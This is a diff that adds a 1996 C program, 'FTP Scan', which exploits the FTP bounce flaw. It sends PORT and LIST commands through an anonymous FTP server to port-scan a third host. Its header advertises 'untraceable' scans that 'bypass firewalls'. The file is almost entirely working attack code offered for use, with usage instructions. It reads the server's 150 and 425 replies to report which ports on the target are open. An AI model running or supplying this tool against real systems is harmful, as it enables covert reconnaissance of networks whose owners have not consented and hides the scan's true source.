@@ -1,0 +1,135 @@
+/*
+ * FTP Scan (C) 1996 Kit Knox <kit@connectnet.com>
+ *
+ * Exploits bug in FTP protocol that allows user to connect to arbritary
+ * IP address and port.
+ *
+ * Features: Untraceable port scans.  Bypass firewalls!
+ *
+ * Example usage:
+ *
+ * ftp-scan ftp.cdrom.com 127.0.0.1 0 1024
+ *
+ * This will scan IP 127.0.0.1 from ftp.cdrom.com from port 0 to 1024
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/param.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <stdarg.h>
+
+int sock;
+char line[1024];
+
+void rconnect(char *server)
+{
+  struct sockaddr_in sin;
+  struct hostent *hp;
+
+  hp = gethostbyname(server);
+  if (hp==NULL) {
+    printf("Unknown host: %s\n",server);
+    exit(0);
+  }
+  bzero((char*) &sin, sizeof(sin));
+  bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
+  sin.sin_family = hp->h_addrtype;
+  sin.sin_port = htons(21);
+  sock = socket(AF_INET, SOCK_STREAM, 0);
+  connect(sock,(struct sockaddr *) &sin, sizeof(sin));
+}
+
+void login(void)
+{
+  char buf[1024];
+
+  sprintf(buf,"USER ftp\n");
+  send(sock, buf, strlen(buf),0);
+  sleep(1);
+  sprintf(buf,"PASS user@\n");
+  send(sock, buf, strlen(buf),0);
+}
+
+void readln(void)
+{
+  int i,done=0,w;
+  char tmp[1];
+
+  sprintf(line,"");
+  i = 0;
+  while (!done) {
+    w=read(sock,tmp, 1, 0);
+    if (tmp[0] != 0) {
+      line[i] = tmp[0];
+    }
+    if (line[i] == '\n') {
+      done = 1;
+    }
+    i++;
+  }
+  line[i] = 0;
+}
+
+void sendln(char s[1024]) {
+  send(sock, s, strlen(s),0);
+}
+
+#define UC(b)   (((int)b)&0xff)
+
+void main(int argc, char **argv)
+{
+  char buf[1024];
+  int i;
+  u_short sport,eport;
+  register char *p,*a;
+  struct hostent *hp;
+  struct sockaddr_in sin;
+  char adr[1024];
+
+  if (argc != 5) {
+    printf("usage: ftp-scan ftp_server scan_host loport hiport\n");
+    exit(-1);
+  }
+
+  hp = gethostbyname(argv[2]);
+  if (hp==NULL) {
+    printf("Unknown host: %s\n",argv[2]);
+    exit(0);
+  }
+  bzero((char*) &sin, sizeof(sin));
+  bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
+
+  rconnect(argv[1]);
+  /* Login anon to server */
+  login();
+  /* Make sure we are in */
+  for (i=0; i<200; i++) {
+    readln();
+    if (strstr(line,"230 Guest")) {
+      printf("%s",line);
+      i = 200;
+    }
+  }
+  a=(char *)&sin.sin_addr;
+  sport = atoi(argv[3]);
+  eport = atoi(argv[4]);
+  sprintf(adr,"%i,%i,%i,%i",UC(a[0]),UC(a[1]),UC(a[2]),UC(a[3]));
+  for (i=sport; i<eport; i++) {
+    sin.sin_port = htons(i);
+    p=(char *)&sin.sin_port;
+    sprintf(buf,"\nPORT %s,%i,%i\nLIST\n",adr,UC(p[0]),UC(p[1]));
+    sendln(buf);
+    sprintf(line,"");
+    while (!strstr(line, "150") && !strstr(line,"425")) {
+      readln();
+    }
+    if (strstr(line,"150")) {
+      printf("%i connected.\n",i);
+    }
+  }
+  close(sock);
+}
